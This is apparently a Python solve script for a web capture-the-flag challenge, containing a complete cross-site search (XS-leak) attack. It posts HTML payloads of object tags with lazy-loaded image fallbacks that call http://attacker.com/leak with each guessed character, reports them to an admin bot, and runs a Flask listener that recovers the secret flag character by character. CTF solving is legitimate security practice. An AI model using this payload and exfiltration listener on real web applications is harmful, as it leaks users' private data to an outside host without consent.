import random
import re
import string
import threading
import requests
from flask import Flask, request
import time
from urllib.parse import quote

app = Flask(__name__)


URL = "http://localhost:3000/"
EVIL = "http://attacker.com/"
BOT = "http://localhost:1337/"

s = requests.session()

r = s.post(URL + "register", data={
    "username": random.randbytes(16).hex(),
    "password": random.randbytes(16).hex()
})

pool = set()

@app.route('/leak')
def leak():
    global pool
    known = request.args.get('v')
    pool.remove(known)
    if len(pool) == 1:
        known = list(pool)[0]
        print(known)
        if known[-1] == "}":
            exit()
        time.sleep(15)
        next(list(pool)[0])
    return "hi"

chars = string.ascii_lowercase + string.digits + "{}_!?"
def next(known):
    global pool
    pool = set([f'{known}{c}' for c in chars])
    payload = "".join([f'<object data="/search?q={quote(known+c)}" type="image/png"><img src="{EVIL}leak?v={quote(known+c)}" loading="lazy"></object>' for c in chars])

    r = s.post(URL + "answer", data={
        "answer": payload,
        "odai": "1"
    })
    answer_id = re.findall(r'<a href="/answer/(\d+)">', r.text)[0]
    s.get(f"{BOT}report/?id={answer_id}")

def solve():
    time.sleep(1)
    next("fwectf{")
    

if __name__ == '__main__':
    thread = threading.Thread(target=solve)
    thread.start()
    app.run(port=9911)
